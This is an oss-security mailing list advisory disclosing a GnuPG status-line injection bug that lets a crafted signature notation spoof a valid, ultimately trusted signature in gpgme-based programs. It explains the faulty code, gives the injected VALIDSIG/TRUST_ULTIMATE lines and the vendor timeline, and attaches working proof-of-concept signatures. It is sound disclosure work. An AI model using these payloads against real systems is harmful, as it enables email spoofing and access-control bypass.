Received: (qmail 16058 invoked by uid 550); 30 Jun 2022 06:31:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9439 invoked from network); 30 Jun 2022 06:18:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	invisiblethingslab.com; h=cc:content-type:date:date:from:from
	:in-reply-to:message-id:mime-version:reply-to:sender:subject
	:subject:to:to; s=fm2; t=1656569915; x=1656656315; bh=70DtzNu237
	VbsSE/oedPyBcLm3ZPGmjhf+6LWfx7zG0=; b=JXx9mAy4CYUYUIcP+K84GNZw8n
	YCXuTIvhQs9PtknmbJTPXWabc7NvRdUvFq9CsVG6i1VdZGeEGKhpNBX9Ix1A/8EC
	YZDDNAEn5EJjv4E9hH5rvzwaJQlLSbNlYqD1a2PODbrxsLMfixJ9uO2qS2EtCpoI
	8huAbFa0as1FQQPFqSPIxfMf4VVxaw2cbQ3aHrd6kMHegEPfAhMcRnRZYN2TnQiB
	vvX7c614HQcrvcmUwH7ysd7F1pIM6Dnl3zqsLmdwVSQzUaBOBzK+fnKpsRI8n+/9
	iTqc2jYePEGYIcFMN6gl96UGMUniB16NTi8ujG/JoJlKxHUH1eTqsLJBktHw==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:content-type:date:date:feedback-id
	:feedback-id:from:from:in-reply-to:message-id:mime-version
	:reply-to:sender:subject:subject:to:to:x-me-proxy:x-me-proxy
	:x-me-sender:x-me-sender:x-sasl-enc; s=fm2; t=1656569915; x=
	1656656315; bh=70DtzNu237VbsSE/oedPyBcLm3ZPGmjhf+6LWfx7zG0=; b=w
	yajkotQvY9oXH5mwUdNmSEI5e85uqbqyxtnma9NWnoNOfbNFwuKVZKT0/0m0euiM
	Y3s8uio2Zg2VGv0flhxYWQbmFoOVvu6jZXh0D27vmekeHXJJAfkYBzjWZNXzwVZE
	fydEsw16TQ33KbB9ojNlxBHXYFSg2ah44Gn8ou31Sbf1eQ08AuoqX6GaVMFisGEP
	Zhfh2ZdTjyRZNWOLLLwqC6sA0Dr5zQ4gJ2hc1o6f92QpZ+BJo0OwmBWUd8dCZ3Mj
	Wd4o4vUsuDkG05XeCD5FNIygRmM+QV+8x1/GYRyUBa1wFnAusru9OXf23A4L//0B
	ZsT3BBNQdEK4S1vZES5Fw==
X-ME-Sender: <xms:O0C9YuZjElre-hLlQxF4vO9TymBdBPqrZC--cJtZko-a9hDhJsaohw>
    <xme:O0C9YhZJk7MR3FVu1JoZUU699dQSIo7g9azIy6ostUhzYbx1lvl3gVp8AIXBPt-_x
    99Z0yH7tdGD5aI>
X-ME-Received: <xmr:O0C9Yo86CDUaEWQCEl3GddazHowxFx3SpGNtX4tbahCN72z1iNFt4peWwiuY>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvfedrudehtddguddtjecutefuodetggdotefrod
    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpqfgfvfdpuffrtefokffrpgfnqfgh
    necuuegrihhlohhuthemuceftddtnecusecvtfgvtghiphhivghnthhsucdlqddutddtmd
    enucfjughrpeffhffvuffkgggtugesghdtreertddtjeenucfhrhhomhepffgvmhhiucfo
    rghrihgvucfqsggvnhhouhhruceouggvmhhisehinhhvihhsihgslhgvthhhihhnghhslh
    grsgdrtghomheqnecuggftrfgrthhtvghrnhepgeeggfeileektdfhtedugeetgedtheff
    udeiueefledvudetleeuffekvdehgeeknecuffhomhgrihhnpehgnhhuphhgrdhorhhgne
    cuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehmrghilhhfrhhomhepuggvmhhi
    sehinhhvihhsihgslhgvthhhihhnghhslhgrsgdrtghomh
X-ME-Proxy: <xmx:O0C9YgrV1DumgoVHZ8jbBoUGHYvwftUW1YkEKLX0TOPvuzIjBJUK5g>
    <xmx:O0C9Ypp1gf4MB7ndZsoyg075w-BgoPllg91rqebbxTud1z7Xo649cw>
    <xmx:O0C9YuQKpiP07eE_OTgqkI9KVvcOReUY-TK9lhms3EYYjMM8eIrapg>
    <xmx:O0C9Ym0l-d7vudV1Ccn9hvgGgMzdJFvDPfUeUE204MFfznewh-a8hw>
Feedback-ID: iac594737:Fastmail
Date: Thu, 30 Jun 2022 02:18:33 -0400
From: Demi Marie Obenour <demi@invisiblethingslab.com>
To: Open Source Software Security <oss-security@lists.openwall.com>
Message-ID: <Yr1AOUYow00A799A@itl-email>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="8m7CPZTXP4QmuXvH"
Content-Disposition: inline
Subject: [oss-security] GnuPG signature spoofing via status line injection

--8m7CPZTXP4QmuXvH
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="MHBR4lPgiS6cvK8z"
Content-Disposition: inline
Date: Thu, 30 Jun 2022 02:18:33 -0400
From: Demi Marie Obenour <demi@invisiblethingslab.com>
To: Open Source Software Security <oss-security@lists.openwall.com>
Subject: GnuPG signature spoofing via status line injection


--MHBR4lPgiS6cvK8z
Content-Type: text/plain; charset=utf-8; protected-headers=v1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

# Background

After discovering that gpgv does not support
--exit-on-status-write-error, I decided to check if it handles write
errors on the status file descriptor properly.  I ultimately found that
while such errors are *not* handled properly, exploiting this flaw in
practice would likely be very difficult and unreliable.  However, in the
course of this research (and entirely accidentally), I found that if a
signature has a notation with a value of 8192 spaces, gpg will crash
while writing the notation=E2=80=99s value to the status FD.  This turned o=
ut to
be a far more severe flaw, with consequences including the ability to
make a signature that will appear to be ultimately valid and made by a
key with any fingerprint one wishes.

# Prerequisites for exploitation

For an attack to be possible, the attacker must control the secret part
of at least one key in the victim's keyring.  The key does *not* need to
be trusted, however.  Depending on the calling code, the attack may work
even if the key is revoked or the signature is expired.  However, if the
program requires that *all* signatures be valid (instead of merely *any*
signature being valid), then a revoked or expired key cannot be used.

Additionally the code calling GnuPG must either not read status data
until end of file, or satisfy both of the following:

- It uses a lax parser that is tolerant of invalid status lines.
- It does not treat a non-zero exit code from GnuPG as an error.

It turns out that gpgme satisfies both requirements, so programs using
gpgme are vulnerable.  Since gpgme is the recommended way to use GnuPG
from a program, I believe that the number of applications that are
vulnerable is very large.

# Impact

If the attacker controls the secret part of any signing-capable key or
subkey in the victim's keyring, they can provide a correctly-formed
signature that some software, including gpgme, will believe to have a
validity and signer fingerprint of the attacker's choosing.  The
consequences of this are highly application-dependent, but are likely to
be serious.  In an email client, this could allow spoofing emails, while
in a system using key fingerprints for access control, this could allow
for an access control bypass.

# Solution

I recommend cherry-picking upstream commit
34c649b3601383cd11dbc76221747ec16fd68e1b, which can be found at
https://dev.gnupg.org/rG34c649b3601383cd11dbc76221747ec16fd68e1b.
Afterwards, it will be necessary to rebuild and reinstall GnuPG.  No
security advisory has been issued by upstream, no patch release is
planned, and no CVE has (to my knowledge) been requested.  Distributions
will need to carry this as an out-of-tree patch until the next upstream
release is made.  For those using GnuPG on Windows, the only solution
will be to build from source.

This does not fix the handling of write errors on the status file
descriptor.  However, I believe that exploiting the mishandling of such
errors is not feasable in general.  On the other hand, the out of bounds
read can be reliably exploited.

# Proof of concept

I have attached a public key, a revoked version of that key, and two
signatures made by the key.  Both signatures are of the empty string;
you can pass /dev/null if the program takes a file instead.
simple-exploit-sig.asc will not work if the key is revoked or expired,
while revoked-exploit-sig.asc *may* work even if the key is revoked or
expired.

# Details

## The bug

GnuPG does not provide an OpenPGP or S/MIME library.  Instead, gpg,
gpgv, and gpgsm all support writing machine-readable text to a
user-provided file descriptor, which is set via the --status-fd
command-line argument.  Other programs and libraries then parse this
output to extract information about what GnuPG has done.

In the case of gpg and gpgv, all status output goes through one of the
functions in g10/cpr.c.  The one of interest here is
write_status_text_and_buffer(), of which the relevant part is reproduced
below.

356  do
357    {
358      if (dowrap)
359        {
360          es_fprintf (statusfp, "[GNUPG:] %s ", text);
361          count =3D dowrap =3D 0;
362          if (first && string)
363            {
364              es_fputs (string, statusfp);
365              count +=3D strlen (string);
366              /* Make sure that there is a space after the string.  */
367              if (*string && string[strlen (string)-1] !=3D ' ')
368                {
369                  es_putc (' ', statusfp);
370                  count++;
371                }
372            }
373          first =3D 0;
374        }
375      for (esc=3D0, s=3Dbuffer, n=3Dlen; n && !esc; s++, n--)
376        {
377          if (*s =3D=3D '%' || *(const byte*)s <=3D lower_limit
378              || *(const byte*)s =3D=3D 127 )
379            esc =3D 1;
380          if (wrap && ++count > wrap)
381            {
382              dowrap=3D1;
383              break;
384            }
385        }
386      if (esc)
387        {
388          s--; n++;
389        }
390      if (s !=3D buffer)
391        es_fwrite (buffer, s-buffer, 1, statusfp);
392      if ( esc )
393        {
394          es_fprintf (statusfp, "%%%02X", *(const byte*)s );
395          s++; n--;
396        }
397      buffer =3D s;
398      len =3D n;
399      if (dowrap && len)
400        es_putc ('\n', statusfp);
401    }
402  while (len);

When writing the data of a notation subpacket, GnuPG requests that
write_status_text_and_buffer() wrap the output at 50 bytes if the
notation is marked as human-readable, or 250 bytes otherwise.  =E2=80=98buf=
fer=E2=80=99
points to the (unsanitized) notation data, and =E2=80=98length=E2=80=99 is =
the length of
that data.  For the subsequent discussion, I will only consider
human-readable notations.  Adapting the exploit to use binary notations
is easy and is left as an exercise for the reader.

If byte 50 needs escaping, esc will be set to 1 on line 379, causing the
loop to exit.  Line 388 will undo the effect of the s++, n-- on line
375, but this will in turn be undone by line 395.  Therefore, line 397
will increase `buffer` by 50.

Now suppose the next byte also needs escaping.  This time, line 380 will
break out of the loop, so the s++, n-- on line 375 will be skipped.
However, the s--; n++ on line 388 will still run, so s is now one *less*
than buffer.  Subtracting them will thus return -1, which becomes
SIZE_MAX when converted to size_t.  As a result, es_fwrite() will try to
write the rest of the address space to the status stream, starting with
byte 51 of the notation data.

## Exploitation

The result of the bug is that es_fwrite() will write bytes to the status
stream (with no escaping) until it hits unmapped memory and segfaults.
The first bytes written, in particular, come from the notation data
itself.  Therefore, they are fully controlled by the attacker.  The only
restriction is that the first byte must be one that needs to be escaped,
but this turns out to be no restriction at all.

Suppose that the the first byte injected is a newline.  At this point,
the status stream is at the start of a line, and the attacker can append
any bytes of their choice to it.  A good choice for the attacker would be:

[GNUPG:] VALIDSIG $subkey_fpr $date $timestamp 0 4 0 22 10 00 $primary_key_=
fpr
[GNUPG:] TRUST_ULTIMATE 0 pgp

Here $subkey_fpr should be replaced with the desired subkey fingerprint,
$date with the desired signing date, $timestamp with the desired
timestamp, and $primary_key_fpr with the desired primary key
fingerprint.  Obviously, the fingerprints can be those of *any* key, or
even ones (such as 0000000000000000000000000000000000000000) that do not
correspond to a real key.  TRUST_ULTIMATE tells the calling program that
the key is ultimately valid.

Following the notation data, gpg will write a bunch more garbage from
its heap before it eventually segfaults.  This garbage is not valid
status data, but it turns out that many programs do not care.  Git stops
at the first NUL byte and gpgme ignores any line that does not start
with "[GNUPG:] ".  Hence, this does not prevent exploitation.

# Timeline

- 2022-06-10: Message sent to security@gnupg.org requesting encryption
  keys for subsequent communication.

- 2022-06-10 through 2022-06-11: Message with encrypted subjects sent to
  GnuPG Security Team.  These messages are automatically discarded by
  Werner Koch's email account.

- 2022-06-12: Message with unencrypted subject sent and received.

- 2022-06-13: Response asking for a specific case where a transient I/O
  error can happen, and acknowledging that the out-of-bounds read is
  real.  Bug is not considered critical and so no immediate security
  release is planned.

- 2022-06-13: I respond mentioning ENOMEM and socket errors as potential
  transient write errors.

- 2022-06-14: Werner Koch commits 34c649b3601383cd11dbc76221747ec16fd68e1b
  to the GnuPG git repository.  From this commit, ticket T6027, and the
  test signature attached to T6027, it is easy to reverse-engineer the
  bug and create an exploit.  There is no public mention that this is a
  security problem.

- 2022-06-15: I followed up stating that it may be possible to control
  the contents of the out-of-bounds memory and that this would make the
  bug much more severe.

- 2022-06-17: Werner responds stating that he has doubts as to whether
  this can be done easily, and noting that GPGME still needs to accept
  the injected data.

- 2022-06-17: I state that I am able to inject arbitrary data into the
  status output, and that the only reason Git is not vulnerable is
  because GnuPG eventually segfaults.

- 2022-06-18: I state that I can make GPGME mark a signature as =E2=80=9Cva=
lid
  green=E2=80=9D (the highest trust level) with whatever fingerprint I wish.

- 2022-06-19: Werner replies stating that he is not able to reproduce
  the injection of arbitrary data into the status output, though he can
  reproduce improper escaping.

- 2022-06-19: I state that the flaw is indeed less severe in git master.

- 2022-06-19: Via `git bisect`, I discover that
  34c649b3601383cd11dbc76221747ec16fd68e1b is in fact the commit that
  fixed the vulnerability, and that arbitrary injection into the status
  line is possible on the immediately preceeding commit
  4dbef2addca8c76fb4953fd507bd800d2a19d3ec.  I provide a reproducer.

- 2022-06-22: I request that this be marked as a security vulnerability
  and have a CVE assigned, and that an immediate security release be
  made.  I note exactly what an attacker who exploits this vulnerability
  can do to a program relying on gpgme.

- 2022-06-29: As Werner Koch has stopped replyng to my emails, and since
  there is still no public indication that GnuPG has a security
  vulnerability (despite the patch already being public), I am publicly
  disclosing the issue.

--=20
Sincerely,
Demi Marie Obenour (she/her/hers)
Invisible Things Lab

--MHBR4lPgiS6cvK8z
Content-Type: application/octet-stream
Content-Description: Public key to verify the two signatures below with
Content-Disposition: attachment; filename="key-without-revocation.asc"
Content-Transfer-Encoding: base64

xjMEYq+NUxYJKwYBBAHaRw8BAQdAOZibYhwKwkgm2R+K5UjNNN9uAx9Td0OU
HiV8IoMwgx/CwBEEHxYKAIMFgmKvjVMFiQWkj70DCwkHCRA9nKuhjMmsLkcU
AAAAAAAeACBzYWx0QG5vdGF0aW9ucy5zZXF1b2lhLXBncC5vcmfyYYRsqYJO
L503xcPTJ4fHvVypKE5l19MRvOTv6/SS6wMVCggCmwECHgEWIQRKJVZYs9jV
LEtcmlM9nKuhjMmsLgAAiF8A/0ovlTi8ipI+F3Q6SvZrCZOwYhwm50pHpvLP
i1ejmh/pAP473wZckuSlrb1zXaJaHF4XhJRsFYS8/xH86QJz84+FBM0XVGVz
dCBLZXkgZm9yIEdudVBHIHZ1bG7CwBQEExYKAIYFgmKvjVMFiQWkj70DCwkH
CRA9nKuhjMmsLkcUAAAAAAAeACBzYWx0QG5vdGF0aW9ucy5zZXF1b2lhLXBn
cC5vcme7YhMr9jcqZm9CwaDHs5oXV6Ga87JTEUWS3rMFlTf6DgMVCggCmQEC
mwECHgEWIQRKJVZYs9jVLEtcmlM9nKuhjMmsLgAAokUBAP4zIMRR7VZpXaf1
lLY6jb9DgBWWFFfmSDzrZEQQNAWSAP9eNT/lfvlGxKK1a4dH3JRtIuKuSgSw
JhqBu2gxR7f9As4zBGKvjVMWCSsGAQQB2kcPAQEHQE56xBuSWAAK+uoPi7QW
V4x8oJD0SKtn/tmHBpdnuFLrwsDFBBgWCgE3BYJir41TBYkFpI+9CRA9nKuh
jMmsLkcUAAAAAAAeACBzYWx0QG5vdGF0aW9ucy5zZXF1b2lhLXBncC5vcmc+
DV4PzBbi+MLpTI0YKJu7MkDcSvrlZG7BKWcT+rxtvAKbAr6gBBkWCgBvBYJi
r41TCRBuC3AAhNYgqUcUAAAAAAAeACBzYWx0QG5vdGF0aW9ucy5zZXF1b2lh
LXBncC5vcmf0V0Q3N/LUPHAOBQLiZloDt29QNPsZ430ZPOB+uiAWoRYhBEtk
dYWh/Rqu6T0lxW4LcACE1iCpAACkgAD9E0Bhcky8HobQT3r39unQ3aHt+R1a
0P/i89e8OFPcK0ABAIth9yQqkGzB3Wz55xM562/y1tox4IJ8peaideY+99wE
FiEESiVWWLPY1SxLXJpTPZyroYzJrC4AAG+hAQDkjE2ovlHzNtKAJJRle4M4
A22eeE/oik6yI0NeepATdwEAtYwlM6cQdoxK/Ctjmx1wy8+/0jrWbEyG8len
iIcxvgfOOARir41TEgorBgEEAZdVAQUBAQdAeJ9oYXYGXOzcuB7r9wU+z1s/
Srg03G3rigKG4hm5jjQDAQgJwsAGBBgWCgB4BYJir41TBYkFpI+9CRA9nKuh
jMmsLkcUAAAAAAAeACBzYWx0QG5vdGF0aW9ucy5zZXF1b2lhLXBncC5vcmcb
/5aJa71IdbleQBcmZEeTzipjkymVD9URiDXvBLT4oAKbDBYhBEolVliz2NUs
S1yaUz2cq6GMyawuAAD3cgD9Fiyx7mtx9/p0/xeRlJXBaxa76LvvRkLPAeDN
Wxj8BvkBAOmVfbJYVyX6tPDKaTYrtntI9kFGDvlWwyYsXXTm75sK

--MHBR4lPgiS6cvK8z
Content-Type: text/plain; charset=us-ascii
Content-Description: Same as key-without-revocation.asc, except that this key also has a revocation certificate
Content-Disposition: attachment; filename="revocation-certificate.asc"

-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEYq+NUxYJKwYBBAHaRw8BAQdAOZibYhwKwkgm2R+K5UjNNN9uAx9Td0OUHiV8
IoMwgx+IoQQgFgoASRYhBEolVliz2NUsS1yaUz2cq6GMyawuBQJivObxKx0CU2Vj
cmV0IGtleSBtYXkgYmUgc2VudCB0byBwbGFjZXMgZm9yIHRlc3QACgkQPZyroYzJ
rC6UjAEAn76oCZqsoMN5rVV7ObVrnHIMdFA/Tjp3cmrzf7OXn0ABAOlElJDu22Au
GBf3eg/Sw6CfapYXIxXrqsY/uUuK8zQPiNEEHxYKAIMFgmKvjVMFiQWkj70DCwkH
CRA9nKuhjMmsLkcUAAAAAAAeACBzYWx0QG5vdGF0aW9ucy5zZXF1b2lhLXBncC5v
cmfyYYRsqYJOL503xcPTJ4fHvVypKE5l19MRvOTv6/SS6wMVCggCmwECHgEWIQRK
JVZYs9jVLEtcmlM9nKuhjMmsLgAAiF8A/0ovlTi8ipI+F3Q6SvZrCZOwYhwm50pH
pvLPi1ejmh/pAP473wZckuSlrb1zXaJaHF4XhJRsFYS8/xH86QJz84+FBLQXVGVz
dCBLZXkgZm9yIEdudVBHIHZ1bG6I1AQTFgoAhgWCYq+NUwWJBaSPvQMLCQcJED2c
q6GMyawuRxQAAAAAAB4AIHNhbHRAbm90YXRpb25zLnNlcXVvaWEtcGdwLm9yZ7ti
Eyv2Nypmb0LBoMezmhdXoZrzslMRRZLeswWVN/oOAxUKCAKZAQKbAQIeARYhBEol
Vliz2NUsS1yaUz2cq6GMyawuAACiRQEA/jMgxFHtVmldp/WUtjqNv0OAFZYUV+ZI
POtkRBA0BZIA/141P+V++UbEorVrh0fclG0i4q5KBLAmGoG7aDFHt/0CuDMEYq+N
UxYJKwYBBAHaRw8BAQdATnrEG5JYAAr66g+LtBZXjHygkPRIq2f+2YcGl2e4UuuJ
AYUEGBYKATcFgmKvjVMFiQWkj70JED2cq6GMyawuRxQAAAAAAB4AIHNhbHRAbm90
YXRpb25zLnNlcXVvaWEtcGdwLm9yZz4NXg/MFuL4wulMjRgom7syQNxK+uVkbsEp
ZxP6vG28ApsCvqAEGRYKAG8FgmKvjVMJEG4LcACE1iCpRxQAAAAAAB4AIHNhbHRA
bm90YXRpb25zLnNlcXVvaWEtcGdwLm9yZ/RXRDc38tQ8cA4FAuJmWgO3b1A0+xnj
fRk84H66IBahFiEES2R1haH9Gq7pPSXFbgtwAITWIKkAAKSAAP0TQGFyTLwehtBP
evf26dDdoe35HVrQ/+Lz17w4U9wrQAEAi2H3JCqQbMHdbPnnEznrb/LW2jHggnyl
5qJ15j733AQWIQRKJVZYs9jVLEtcmlM9nKuhjMmsLgAAb6EBAOSMTai+UfM20oAk
lGV7gzgDbZ54T+iKTrIjQ156kBN3AQC1jCUzpxB2jEr8K2ObHXDLz7/SOtZsTIby
V6eIhzG+B7g4BGKvjVMSCisGAQQBl1UBBQEBB0B4n2hhdgZc7Ny4Huv3BT7PWz9K
uDTcbeuKAobiGbmONAMBCAmIxgQYFgoAeAWCYq+NUwWJBaSPvQkQPZyroYzJrC5H
FAAAAAAAHgAgc2FsdEBub3RhdGlvbnMuc2VxdW9pYS1wZ3Aub3JnG/+WiWu9SHW5
XkAXJmRHk84qY5MplQ/VEYg17wS0+KACmwwWIQRKJVZYs9jVLEtcmlM9nKuhjMms
LgAA93IA/RYsse5rcff6dP8XkZSVwWsWu+i770ZCzwHgzVsY/Ab5AQDplX2yWFcl
+rTwymk2K7Z7SPZBRg75VsMmLF105u+bCg==
=x3mk
-----END PGP PUBLIC KEY BLOCK-----

--MHBR4lPgiS6cvK8z
Content-Type: text/plain; charset=us-ascii
Content-Description: Simple exploit that will only work if the revocation certificate has not been imported
Content-Disposition: attachment; filename="simple-exploit-sig.asc"

-----BEGIN PGP SIGNATURE-----

wsDxBAAWCgFjBYJir44CCRBuC3AAhNYgqcAyFIAAAAAADwDaYm9ndXNAYS5pbnZh
bGlkYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh
YWFhYSAKW0dOVVBHOl0gVkFMSURTSUcgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
MDAwMDAwMDAwMDAwMDAwMCAyMDIyLTA2LTE4IDE2NTU1Nzg3NDEgMCA0IDAgMjIg
MTAgMDAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMApb
R05VUEc6XSBUUlVTVF9VTFRJTUFURSAwIHBncApHFAAAAAAAHgAgc2FsdEBub3Rh
dGlvbnMuc2VxdW9pYS1wZ3Aub3JnJdCtcOd2RGehR7HGZTStcqoQb25CtgZUb2ub
5rsGmm4WIQRLZHWFof0aruk9JcVuC3AAhNYgqQAAPSUBAKkoYs958YNGe+tGxbcd
iJbpNnvLq7N2RgPJHqVrKfAMAP97QEv1/E+K/ZscdhdDcE7nb60lSdnXdB/WCh7X
v/gVCg==
=BANC
-----END PGP SIGNATURE-----

--MHBR4lPgiS6cvK8z
Content-Type: text/plain; charset=us-ascii
Content-Description: Proof of concept that may work even if the revocation certificate has been imported
Content-Disposition: attachment; filename="revoked-exploit-sig.asc"

-----BEGIN PGP SIGNATURE-----

wsESBAAWCgGEBYJivO32CRBuC3AAhNYgqcBTFIAAAAAADwD7Ym9ndXNAYS5pbnZh
bGlkYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh
YWFhYSAKW0dOVVBHOl0gTkVXU0lHCltHTlVQRzpdIEdPT0RTSUcKW0dOVVBHOl0g
VkFMSURTSUcgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
MCAyMDIyLTA2LTE4IDE2NTU1Nzg3NDEgMCA0IDAgMjIgMTAgMDAgMDAwMDAwMDAw
MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMApbR05VUEc6XSBUUlVTVF9V
TFRJTUFURSAwIHBncApHFAAAAAAAHgAgc2FsdEBub3RhdGlvbnMuc2VxdW9pYS1w
Z3Aub3JnrNidlMeEUaQ50HW1Vl8llQ1vuhlMmLQZXpXBhqQBjuQWIQRLZHWFof0a
ruk9JcVuC3AAhNYgqQAAx4QBAMu8G+cs3lpy0TAKBD5D/7/SbR34jrRLbeleHicY
jYvRAQDSIWfSvQVaEq4zeCYtt+KtI2kLgSxGjH3DC86bvjmwAw==
=JxW2
-----END PGP SIGNATURE-----

--MHBR4lPgiS6cvK8z--

--8m7CPZTXP4QmuXvH
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEdodNnxM2uiJZBxxxsoi1X/+cIsEFAmK9QDkACgkQsoi1X/+c
IsFM5g//ezhyx3aG1PIUauanINd3C9F++S6GLM1KQOMvuBmER1sz62O5Cao2cJUN
9ELqqA/dUcenB9i6fTHMvLvD8nncngpi0n5n62AGf2veWmSUWnHYcLVpgqvJN92G
Pfl7jlhyV6N1dMUg04cFpsHyeiT2yiQNIC3EsPOd/eqv6chWEje9IyJ7zCJDk8zp
GgAlg4ljES2QaAlMKwhX/7JP/cg9tHrs+f8qDYgpip4+G9ex+gbWflKKi1045K46
jivyz8YX3QVL+gPbVzqPadsRue1dW00BhAxTBAAVWGBq31l9ifNPoTngHegYfUeW
ntNzbYiHBy7T2j4ICIZcGhZf7+B+X4jLKgZmRmNonTRlBCA32ZAjt887XXqaZMfI
iccKF4YXL5MnsNGOscBlRIFqDLdMBJ3ODQ2HfYuVzQm2R09jTj3IZsolrtFn0Pej
J5MZc9SWyJmqinvbXvqMbeUr1uqyQLM5HlUJ1VapS07ctE9EiIWZk7JJ2RZkGEtn
LP+DBFDq43fwQoWur2cY1fp25xRO70Oux9LuW/L/X6PcSA+PPbBwVmBPq6GuGE1S
uFvR+cNvDOBiFJ6nLpH9er44GDda3d4+VcIEjD2pxY9WdO34TMKhGVEVF1+CMfB1
P3+N90SSlpniOjG5NkfmhU+GQNo9z2sJi4/FPII6wDNlHOSzN2c=
=kTb3
-----END PGP SIGNATURE-----

--8m7CPZTXP4QmuXvH--
